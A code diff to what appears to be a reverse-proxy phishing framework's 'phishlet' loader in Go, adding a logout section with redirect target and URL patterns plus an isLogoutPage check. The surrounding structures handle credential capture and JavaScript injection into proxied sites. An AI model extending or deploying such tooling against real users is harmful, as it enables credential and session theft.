@@ -73,6 +73,11 @@ type LoginUrl struct {
 	path   string `mapstructure:"path"`
 }
 
+type LogoutUrl struct {
+	redirect_to string           `mapstructure:"redirect_to"`
+	urls        []*regexp.Regexp `mapstructure:"urls"`
+}
+
 type JsInject struct {
 	trigger_domains []string         `mapstructure:"trigger_domains"`
 	trigger_paths   []*regexp.Regexp `mapstructure:"trigger_paths"`
@@ -98,6 +103,7 @@ type Phishlet struct {
 	custom       []PostField
 	forcePost    []ForcePost
 	login        LoginUrl
+	logout		 LogoutUrl
 	js_inject    []JsInject
 }
 
@@ -160,6 +166,11 @@ type ConfigLogin struct {
 	Path   *string `mapstructure:"path"`
 }
 
+type ConfigLogout struct {
+	RedirectTo *string        `mapstructure:"redirect_to"`
+	Urls       []*string      `mapstructure:"urls"`
+}
+
 type ConfigJsInject struct {
 	TriggerDomains *[]string `mapstructure:"trigger_domains"`
 	TriggerPaths   *[]string `mapstructure:"trigger_paths"`
@@ -177,6 +188,7 @@ type ConfigPhishlet struct {
 	ForcePosts  *[]ConfigForcePost `mapstructure:"force_post"`
 	LandingPath *[]string          `mapstructure:"landing_path"`
 	LoginItem   *ConfigLogin       `mapstructure:"login"`
+	LogoutItem  *ConfigLogout      `mapstructure:"logout"`
 	JsInject    *[]ConfigJsInject  `mapstructure:"js_inject"`
 }
 
@@ -204,6 +216,8 @@ func (p *Phishlet) Clear() {
 	p.authUrls = []*regexp.Regexp{}
 	p.username.key = nil
 	p.username.search = nil
+	p.logout.redirect_to = ""
+	p.logout.urls = nil
 	p.password.key = nil
 	p.password.search = nil
 	p.custom = []PostField{}
@@ -422,6 +436,11 @@ func (p *Phishlet) LoadFromFile(site string, path string) error {
 		return fmt.Errorf("login: missing `path` field")
 	}
 	p.login.domain = *fp.LoginItem.Domain
+	if fp.LogoutItem != nil && fp.LogoutItem.RedirectTo != nil {
+		p.logout.redirect_to = *fp.LogoutItem.RedirectTo
+	} else {
+		p.logout.redirect_to = ""
+	}
 	if p.login.domain == "" {
 		return fmt.Errorf("login: `domain` field cannot be empty")
 	}
@@ -447,6 +466,18 @@ func (p *Phishlet) LoadFromFile(site string, path string) error {
 	}
 	if p.login.path[0] != '/' {
 		p.login.path = "/" + p.login.path
+	}
+	if fp.LogoutItem != nil && fp.LogoutItem.Urls != nil {
+		for i := range fp.LogoutItem.Urls {
+			re, err := regexp.Compile(*fp.LogoutItem.Urls[i])
+			if err != nil {
+				return fmt.Errorf("logout.url: %v", err)
+			}
+			p.logout.urls = append(p.logout.urls, re)
+		}
+	} else {
+		p.logout.redirect_to = ""
+		p.logout.urls = nil
 	}
 
 	if fp.Credentials.Custom != nil {
@@ -830,4 +861,15 @@ func (p *Phishlet) parseVersion(ver string) (PhishletVersion, error) {
 		return ret, err
 	}
 	return ret, nil
+}
+
+func (p *Phishlet) isLogoutPage(url string) bool {
+	if p.logout.redirect_to != "" {
+		for i := range p.logout.urls {
+			if p.logout.urls[i].MatchString(url) {
+				return true
+			}
+		}
+	}
+	return false
 }
